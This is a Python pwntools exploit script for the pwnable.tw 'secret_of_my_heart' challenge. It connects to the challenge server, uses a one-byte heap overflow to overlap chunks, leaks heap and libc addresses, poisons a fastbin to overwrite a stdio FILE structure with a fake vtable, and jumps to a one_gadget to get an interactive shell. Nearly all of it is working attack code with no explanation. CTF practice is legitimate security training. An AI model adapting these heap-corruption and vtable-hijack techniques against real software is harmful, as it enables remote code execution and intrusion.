from pwn import *

local = False

if local:
	r = process("./secret_of_my_heart")
	malloc_hook_off = 0x3c4b10
	stdin_off = 0x3c5710
	xsputn_off = 0x791e0
	onegadget = 0x4526a
else:
	r = remote("chall.pwnable.tw", 10302)
	malloc_hook_off = 0x3c3b10
	stdin_off = 0x3c4710
	xsputn_off = 0x791e0
	onegadget = 0x4526a

def add(size, name, secret):
	r.sendline("1")
	r.recvuntil("Size of heart :")
	r.sendline(str(size))
	r.recvuntil("Name of heart :")
	r.send(name)
	r.recvuntil("secret of my heart :")
	r.send(secret)
	r.recvuntil("Your choice :")
def show(index):
	r.sendline("2")
	r.recvuntil("Index :")
	r.sendline(str(index))
	return r.recvuntil("Your choice :")
def delete(index):
	r.sendline("3")
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("Your choice :")

# first chunk -> (a)
payload = "a"*0x1c + "bbbb"
add(0x18, payload, "\n")   # 0
result =  show(0)
result = result.split("bbbb")[1][:6] + "\x00\x00"
heap_base = u64(result) - 0x10
print "Heap_base: " + hex(heap_base)

# the second chunk -> (b), overwroten 1byte chunk
payload = "\x00"*0xf0 + p64(0x100) + p64(0x20)
add(0x100, "\n", payload)   # 1
# the third chunk -> (c)
payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)
add(0x100, '\n', payload)    # 2
# avoid consolidate with top chunk
# and fake vtable stored here
add(0x50, "\n", "\n")   # 3

delete(1)
delete(0)

# overwrite 1 byte of the second chunk
add(0x18, '\n', "a"*0x18)   # 0
# b1 chunk # fast chunk
add(0x80, "\n", "\n")   # 1

# b2 chunk = fast chunk
add(0x60, "\n", "\n")   # 4

delete(1)
delete(2)

# next malloc will point to our forgotten chunk
# so now it set fd bk point to main_arena+88
add(0x80, "\n", "\n")    # 1

# leak heap
result = show(4)
result = result.split("Secret : ")[1][:6] + "\x00\x00"
libc_base = u64(result) - 88 - 0x10 - malloc_hook_off

print "Libc_base: " + hex(libc_base)

# make fake vtable
# onegadget in overflow
# because xsputn not working
delete(3)
payload = p64(0)*3 + p64(libc_base+onegadget) + p64(0)*3 + p64(libc_base+xsputn_off)
add(0x50, "\n", payload)   # 2

# after leaking libc_base, restore unsorted bin point to 0x...30
delete(1)

# set size of chunk4 = 0x31 (chunk4 is our forgotten chunk)
payload = "\x00"*0x80 + p64(0) + p64(0x71) 
add(0x100, "\n", payload)   # 1

# make chunk4 go into fast bin
delete(4)

# delte aim to the next malloc will overwrite chunk4.fd
delete(1)

# overwrite chunk4.fd = stdout memory
payload += p64(libc_base+stdin_off - 0x50 + 5 - 8)
add(0x100, "\n", payload)   # 1

# now fastbin point to stdout+0x.. memory
add(0x60, "\n", "\n")   # 3


# overwrite vtable
payload = "\x00"*3 + p64(0)*5 + p64(heap_base+0x20+0x110*2+0x10)
#add(0x60, "\n", payload)
r.sendline("1")
r.recvuntil("Size of heart :")
r.sendline(str(0x60))
r.recvuntil("Name of heart :")
r.send("\n")
r.recvuntil("secret of my heart :")
r.send(payload)

r.interactive()

